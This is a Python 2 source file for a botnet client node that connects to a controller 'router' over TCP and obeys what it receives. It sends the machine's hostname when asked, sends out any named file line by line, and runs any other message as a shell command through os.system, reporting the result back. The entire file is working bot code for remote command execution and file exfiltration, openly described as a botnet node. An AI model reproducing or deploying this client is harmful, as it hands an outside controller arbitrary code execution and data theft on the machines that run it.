#!/usr/bin/env python

"""
A Bot Client connection for route.py
	Tested with Python 2.7.6 on MACOSX and Ubuntu
----------------------------------------------------
Control commands for the bot:
	replyto X: Set default replyto address for broadcast commands
	hostname: Send the client's hostname
	sendfile 'myfile': Send the specified file line-by-line
	exit: Disconnect the client

Any other message will be executed directly with the 
os.system command.
"""

##### Imports #####
#from threading import Thread
from sys import argv
from os import system
from socket import (
			socket, AF_INET, SHUT_RDWR,
			SOCK_STREAM, SOL_SOCKET,
			SO_REUSEADDR, gethostname,
			error as sockerr
			)
from argparse import (
			ArgumentParser,
			ArgumentDefaultsHelpFormatter,
			RawDescriptionHelpFormatter
			)
####################

#### (Magic) Defaults ####
ACCESS_ADDR = ''
PORT = 23456
HOST = 'localhost'
BUFFSIZE = 2048
VERSION = '1.0'
##########################

####### Argument Parser #######
class ArgFormatter(RawDescriptionHelpFormatter, 
					ArgumentDefaultsHelpFormatter):
	''' The best of both worlds '''
	pass
def parseargs(args):
	verbose = "verbose output and responses"
	pars = ArgumentParser(
		formatter_class=ArgFormatter,
	    fromfile_prefix_chars='<',
	    description=__doc__
	)
	pars.add_argument(
		'HOST',
		nargs = '?',
		default=HOST,
		help='The IP of the router',
		type=str
	)
	pars.add_argument(
		'PORT',
		nargs = '?',
		default=PORT,
		help='The port number of the router',
		type=int
	)
	pars.add_argument(
		'-v','--verbose',
		help=verbose,
		action='store_true'
	)
	pars.add_argument(
		'--version',
		action='version',
		version='%(prog)s ' + VERSION
	)
	pars.add_argument(
			'--buffer', '-b',
			type=int,
			metavar='M',
			choices=range(2048,10240),
			default=BUFFSIZE,
			help="The maximum size M of messages to \
					accept (2048 < M < 10240)"
	)
	return pars.parse_args(args)
####################################################

def clientsocket(host, port):
	''' Create a client socket ''' 
	s = socket(AF_INET, SOCK_STREAM)
	s.setsockopt(SOL_SOCKET, SO_REUSEADDR, 1)
	s.connect((host,port))
	return s

class Exit(Exception):
	''' An Abuse of Exceptions 
	... because return codes are just ugly'''
	pass

# This class represents a node in the botnet
class DDSClient:
	# Constructor
	def __init__(self, host = HOST, port = PORT, verbose=False, buffsize=BUFFSIZE):
		try:
			self.client = clientsocket(host, port)
			self.address = int(self.client.recv(10).strip())
			if verbose:
				print self.address
		except Exception as e:
			if verbose:
				print "Error: Unable to connect"
			raise

		# sendto address for broadcast messages
		self.master = None

		# Map strings to commands and num args
		self.cmdmap = {
			"exit": (self.close, 0), 
			"replyto": (self.set_master, 2),
			"sendfile": (self.sendfile, 2),
			"hostname": (self.hostname, 1),
		}

		# Verbose output
		self.verbose = verbose

		#buffer size
		self.buffsize = buffsize

### Boiler plate ###
	def __repr__(self):
		return str("Commands: %d \n Sending To: %i\n" 
			% self.cmdmap % self.sendto)

	def __str__(self):
		return self.__repr__

	# Close the client socket and raise Exit
	def __del__(self):
		try:
			self.client.shutdown(SHUT_RDWR)
			self.client.close()
		except Exception:
			pass


#####################
# Send the response
	def respond(self, to, payload):
		if int(to) == 255:
			if self.master:
				to = self.master
			elif self.verbose:
				print "Error: No replyto address specified"
				return
			else:
				return 

		res = str(to) + ": " + str(payload)
		if self.verbose:
			print "Sending..."
			print res
		self.client.send(res)


	# Handle the received command
	def _handle_msg(self, msg):
		mtuple = msg.split(":", 1)
		try:
			to = int(mtuple[0])
		except ValueError:
			raise
		payload = mtuple[1].strip()	
		try:
			cmdstr,arg = payload.split(' ', 1)
		except ValueError:
			# No args
			cmdstr = payload
			arg = None
		try:
			cmd, nargs = self.cmdmap[cmdstr]

			if nargs == 0:
				cmd()
			elif nargs == 1:
				cmd(to)
			elif nargs == 2:
				if arg:
					cmd(to, arg)
				elif self.verbose:
					respond(to, "Invalid Args")
		except KeyError:
			# no built-in command: execute payload
			self.execute(to, payload)
		except Exit:
			raise

# Commands ###
	def set_master(self, to, master):
		self.master = int(master)
		if self.verbose:
			self.respond(to, "Set replyto address successfully")

	def hostname(self,to):
		self.respond(to, gethostname())

	def sendfile(self, to, sfile):
		respond = self.respond
		sfile = sfile.strip("'\"")
		try:
			with open(sfile, 'r') as F:
				for line in F:
					respond(to, line)
		except IOError:
			if self.verbose:
				respond(to, "Error: %s not found" %sfile)

	def execute(self,to, payload):
		rval = system(payload)
		if self.verbose:
			self.respond(to, "Executed: '%s' \r\n" %payload)
		self.respond(to, rval)

	def close(self):
		self.respond(self.address, '0')
		del self
		raise Exit
	
##############

# Listen for commands from the router
	def listen(self):
		# Localize functions
		recv = self.client.recv
		handle = self._handle_msg
		verbose = self.verbose
		buffsize = self.buffsize
		while True:
			try:
				msg = recv(buffsize)
				if msg:
					if verbose:
						print "Received: %s" % (msg,)
					handle(msg)
				else:
					return
			except:
				raise

# Start listening for commands
	def __call__(self):
		try:
			client = self.listen()
		#exception abuse
		except Exit:
			return

def main():
	# parse args
	args = parseargs(argv[1:])

	try:
		# Create a bot
		botConnect = DDSClient(host = args.HOST, port=args.PORT,
								verbose=args.verbose, buffsize=args.buffer)
		# listen for commands
		botConnect()
	except sockerr:
		print "The router appears to be down :("
	except KeyboardInterrupt:
		print "\nExiting..."


if __name__ == '__main__':
	main()
